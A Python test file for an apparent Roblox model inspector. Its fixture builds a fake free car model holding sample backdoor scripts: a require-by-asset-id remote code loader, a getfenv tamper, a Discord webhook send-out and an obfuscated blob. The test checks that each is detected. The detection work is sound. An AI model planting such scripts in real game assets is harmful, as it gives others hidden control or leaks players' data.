#!/usr/bin/env python3
"""`rhr inspect` (rhr.inspect): what a file holds, and findings for risky script code.

A made-up free model (XML) with a clean script, a backdoor `require(<id>)`, `getfenv`,
a webhook, an obfuscated blob and a virus-named script: each finding is where it
should be, with its line, and the clean code has none. The same model's classes,
scripts and assets are counted; a binary fixture is read too.

    python tests/test_inspect.py
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "src"))

failures: list[str] = []


def check(ok: bool, message: str) -> None:
    print(f"  {'ok  ' if ok else 'FAIL'} {message}")
    if not ok:
        failures.append(message)


def script(class_name: str, name: str, source: str, disabled: bool = False) -> str:
    return (f'<Item class="{class_name}"><Properties><string name="Name">{name}</string>'
            f'<bool name="Disabled">{str(disabled).lower()}</bool>'
            f'<ProtectedString name="Source"><![CDATA[{source}]]></ProtectedString></Properties></Item>')


NL = "\n"
MODEL = f"""<roblox version="4">
<Item class="Model"><Properties><string name="Name">FreeCar</string></Properties>
  <Item class="Part"><Properties><string name="Name">Body</string></Properties>
    {script("Script", "Drive", "local seat = script.Parent" + NL + "print('vroom')")}
    {script("Script", "Weld", "local x = 1" + NL + "local m = require(4812345678)" + NL + "m.run()")}
    {script("Script", "Vaccine", "getfenv(0).game = nil", disabled=True)}
    <Item class="Decal"><Properties><string name="Name">Logo</string><Content name="Texture"><url>rbxassetid://12345678</url></Content></Properties></Item>
  </Item>
  <Item class="MeshPart"><Properties><string name="Name">Wheel</string><Content name="MeshId"><url>rbxassetid://987654321</url></Content></Properties>
    {script("LocalScript", "Stats", 'local h = game:GetService("HttpService")' + NL + 'h:PostAsync("https://discord.com/api/webhooks/1/abc", "x")')}
    {script("ModuleScript", "Lib", "return " + "(\\\\104\\\\101);" * 600)}
  </Item>
</Item>
</roblox>"""


def main() -> int:
    from rhr.inspect import inspect

    with tempfile.TemporaryDirectory(prefix="rhr-inspect-") as directory:
        path = Path(directory) / "FreeCar.rbxmx"
        path.write_text(MODEL, encoding="utf-8")
        proc = subprocess.run([sys.executable, "-m", "rhr", "inspect", "--all", str(path)], capture_output=True, text=True,
                              encoding="utf-8", timeout=120)
        check(proc.returncode == 0, f"exit code {proc.returncode}: {proc.stderr[-300:]}")
        report = json.loads(proc.stdout)
    print("the report")
    check(report["schema"] == "rhr.inspect/1" and report["kind"] == "model", f"{report['schema']}, {report['kind']}")
    check(report["classCounts"].get("Script") == 3 and report["classCounts"].get("MeshPart") == 1, str(report["classCounts"]))
    paths = {s["path"]: s for s in report["scripts"]}
    check(set(paths) == {"FreeCar/Body/Drive", "FreeCar/Body/Weld", "FreeCar/Body/Vaccine", "FreeCar/Wheel/Stats",
                         "FreeCar/Wheel/Lib"}, f"scripts: {sorted(paths)}")
    check(paths["FreeCar/Body/Vaccine"]["disabled"] and not paths["FreeCar/Body/Drive"]["disabled"], "disabled is read")
    check(paths["FreeCar/Body/Weld"]["lines"] == 3, f"lines: {paths['FreeCar/Body/Weld']['lines']}")
    check(report["assets"]["images"] == ["12345678"] and report["assets"]["meshes"] == ["987654321"],
          f"assets: {report['assets']}")

    print("the findings")
    found = {(f["check"], f["path"], f["line"]) for f in report["findings"]}
    for expected in [("require-by-id", "FreeCar/Body/Weld", 2), ("fenv", "FreeCar/Body/Vaccine", 1),
                     ("virus-name", "FreeCar/Body/Vaccine", None), ("webhook", "FreeCar/Wheel/Stats", 2),
                     ("obfuscated", "FreeCar/Wheel/Lib", 1)]:
        check(expected in found, f"{expected[0]} at {expected[1]}:{expected[2]}")
    check(not any(f["path"] == "FreeCar/Body/Drive" for f in report["findings"]), "the clean script has no finding")
    check(report["findings"][0]["severity"] == "error", "errors come first")

    print("a binary file")
    binary = inspect(REPO / "tests" / "fixtures" / "highlight.rbxm")
    check(binary["instances"] > 0 and binary["schema"] == "rhr.inspect/1", f"{binary['instances']} instances read")
    if failures:
        print(f"{len(failures)} failure(s)")
        return 1
    print("inspect: ok")
    return 0


def test_main():
    from _harness import run_main

    run_main(main)


if __name__ == "__main__":
    raise SystemExit(main())
